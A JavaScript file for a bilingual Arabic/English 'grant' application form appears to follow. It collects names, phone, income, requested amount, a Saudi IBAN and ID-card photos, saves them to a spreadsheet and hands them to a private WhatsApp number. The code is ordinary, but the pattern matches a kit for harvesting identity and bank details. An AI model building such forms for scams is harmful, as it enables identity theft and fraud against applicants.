/* ================================
   PORTAL JAVASCRIPT - FINAL FIX
   ================================ */

let currentLanguage = 'ar';
let currentStep = 1;

const formData = {
    personalInfo: {},
    contactCareer: {},
    grantDetails: {},
    bankingInfo: {},
    attachments: {}
};

document.addEventListener('DOMContentLoaded', function() {
    setupLanguageSwitchers();
    setupFormListeners();
    setupFileUpload();
    setupIBANFormatting();
});

// ================================
// LANGUAGE
// ================================
function setupLanguageSwitchers() {
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            switchLanguage(this.getAttribute('data-lang'));
        });
    });
}

function switchLanguage(lang) {
    currentLanguage = lang;
    document.querySelectorAll('[data-en][data-ar]').forEach(el => {
        const text = lang === 'en' ? el.getAttribute('data-en') : el.getAttribute('data-ar');
        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            el.placeholder = text;
        } else {
            el.textContent = text;
        }
    });
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl';
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.toggle('active', btn.getAttribute('data-lang') === lang);
    });
}

// ================================
// NAVIGATION
// ================================
function nextStep() {
    if (validateStep(currentStep)) {
        saveStepData(currentStep);
        currentStep++;
        updateProgressBar();
        showStep(currentStep);
    }
}

function prevStep() {
    saveStepData(currentStep);
    currentStep--;
    updateProgressBar();
    showStep(currentStep);
}

function showStep(stepNumber) {
    document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
    document.getElementById('formStep' + stepNumber).classList.add('active');
    document.querySelector('.portal-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function updateProgressBar() {
    document.getElementById('progressFill').style.width = (currentStep / 5 * 100) + '%';
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('step' + i);
        el.classList.remove('active', 'completed');
        if (i < currentStep) el.classList.add('completed');
        else if (i === currentStep) el.classList.add('active');
    }
}

// ================================
// VALIDATION
// ================================
function validateStep(stepNumber) {
    var isValid = true;
    var step = document.getElementById('formStep' + stepNumber);

    step.querySelectorAll('[required]').forEach(function(input) {
        if (input.type === 'file' || input.type === 'checkbox') return;
        if (!validateField(input)) isValid = false;
    });

    if (stepNumber === 5) {
        ['idCardFront', 'idCardBack'].forEach(function(id) {
            var errorEl = document.getElementById(id + 'Error');
            if (!formData.attachments[id]) {
                if (errorEl) errorEl.textContent = currentLanguage === 'ar' ? 'يرجى رفع هذه الصورة' : 'Please upload this photo';
                isValid = false;
            } else {
                if (errorEl) errorEl.textContent = '';
            }
        });
        if (!document.getElementById('terms').checked) isValid = false;
    }

    return isValid;
}

function validateField(field) {
    var value = field.value.trim();
    var errorEl = field.closest('.form-group') && field.closest('.form-group').querySelector('.error-message');
    var isValid = true;
    var msg = '';

    if (!value) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'هذا الحقل مطلوب' : 'This field is required';
    } else if (field.type === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'البريد الإلكتروني غير صحيح' : 'Invalid email';
    } else if (field.name === 'phone' && !/^\+?[0-9\s\-\(\)]{10,20}$/.test(value)) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'رقم الهاتف غير صحيح' : 'Invalid phone number';
    } else if (field.name === 'iban' && !/^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/.test(value.replace(/\s/g, ''))) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'رقم الآيبان غير صحيح' : 'Invalid IBAN';
    } else if ((field.name === 'grantAmount' || field.name === 'income') && (isNaN(value) || Number(value) <= 0)) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'يجب أن يكون رقماً موجباً' : 'Must be a positive number';
    }

    field.classList.toggle('error', !isValid);
    if (errorEl) errorEl.textContent = isValid ? '' : msg;
    return isValid;
}

// ================================
// SAVE STEP DATA
// ================================
function saveStepData(stepNumber) {
    var step = document.getElementById('formStep' + stepNumber);
    var groups = [null, formData.personalInfo, formData.contactCareer, formData.grantDetails, formData.bankingInfo];
    var group = groups[stepNumber];
    if (!group) return;
    step.querySelectorAll('input, select, textarea').forEach(function(input) {
        if (input.type === 'file' || input.type === 'checkbox') return;
        if (input.name) group[input.name] = input.value;
    });
}

// ================================
// FILE UPLOAD
// ================================
function setupFileUpload() {
    ['idCardFront', 'idCardBack'].forEach(function(id) {
        var input   = document.getElementById(id);
        var preview = document.getElementById(id + 'Preview');
        var errorEl = document.getElementById(id + 'Error');
        var area    = document.getElementById(id + 'Area');
        if (!input) return;

        input.addEventListener('change', function() {
            var file = this.files && this.files[0];
            if (!file) return;
            processFile(file, id, input, preview, errorEl, area);
        });
    });
}

function processFile(file, id, input, preview, errorEl, area) {
    if (file.size > 5 * 1024 * 1024) {
        if (errorEl) errorEl.textContent = 'حجم الملف أكبر من 5 ميجابايت';
        input.value = '';
        return;
    }
    if (!file.type.startsWith('image/') && file.type !== 'application/pdf') {
        if (errorEl) errorEl.textContent = 'يُسمح فقط بـ JPG أو PNG أو PDF';
        input.value = '';
        return;
    }
    if (errorEl) errorEl.textContent = '';
    formData.attachments[id] = file;

    preview.innerHTML = '<i class="fas fa-check-circle" style="color:#27ae60"></i> ' + file.name;
    preview.style.display = 'block';
    preview.style.padding = '0.8rem';
    preview.style.background = '#f0fdf4';
    preview.style.borderRadius = '8px';
    preview.style.marginTop = '0.5rem';
    if (area) area.style.borderColor = '#27ae60';
}

function removeFile(id) {
    var input   = document.getElementById(id);
    var preview = document.getElementById(id + 'Preview');
    var area    = document.getElementById(id + 'Area');
    if (input) input.value = '';
    if (preview) { preview.style.display = 'none'; preview.innerHTML = ''; }
    if (area) area.style.borderColor = '';
    delete formData.attachments[id];
}

// ================================
// IBAN FORMAT
// ================================
function setupIBANFormatting() {
    var iban = document.getElementById('iban');
    if (!iban) return;
    iban.addEventListener('input', function() {
        var v = this.value.toUpperCase().replace(/\s/g, '');
        if (!v.startsWith('SA')) v = 'SA' + v.replace(/[^0-9]/g, '');
        v = v.slice(0, 24);
        this.value = v.match(/.{1,4}/g) ? v.match(/.{1,4}/g).join(' ') : v;
    });
}

// ================================
// SUBMIT
// ================================
function setupFormListeners() {
    var submitBtn = document.getElementById('submitBtn');
    if (!submitBtn) return;

    submitBtn.addEventListener('click', async function() {
        if (!validateStep(5)) return;
        saveStepData(5);

        // تعطيل الزر أثناء الحفظ
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';

        var txNumber = 'WA-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random() * 90000) + 10000);

        // حفظ في Supabase أولاً
        var saved = await saveToGoogleSheets(txNumber);

        // إعادة تفعيل الزر
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> تقديم الطلب';

        // فتح واتس آب
        var msg = encodeURIComponent(
            'مرحباً، لقد قمت بتقديم طلب منحة.\n' +
            'رقم المعاملة: ' + txNumber + '\n' +
            'الاسم: ' + (formData.personalInfo.fullName || '') + '\n' +
            'الهاتف: ' + (formData.contactCareer.phone || '') + '\n' +
            'نوع المنحة: ' + (formData.grantDetails.grantType || '') + '\n' +
            'المبلغ: ' + (formData.grantDetails.grantAmount || '') + ' ريال'
        );
        window.open('https://wa.me/966545239928?text=' + msg, '_blank');

        // إظهار رسالة النجاح
        document.getElementById('transactionNumber').textContent = txNumber;
        document.getElementById('successModal').classList.add('active');
    });
}

function redirectToWhatsApp() {
    document.getElementById('successModal').classList.remove('active');
    document.getElementById('grantForm').reset();
    formData.attachments = {};
    ['idCardFront', 'idCardBack'].forEach(function(id) { removeFile(id); });
    currentStep = 1;
    updateProgressBar();
    showStep(1);
}

// Google Sheets متوفر في js/sheets.js

// Validation on blur
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('input:not([type=file]), select, textarea').forEach(function(field) {
        field.addEventListener('blur', function() {
            if (this.hasAttribute('required')) validateField(this);
        });
    });
});
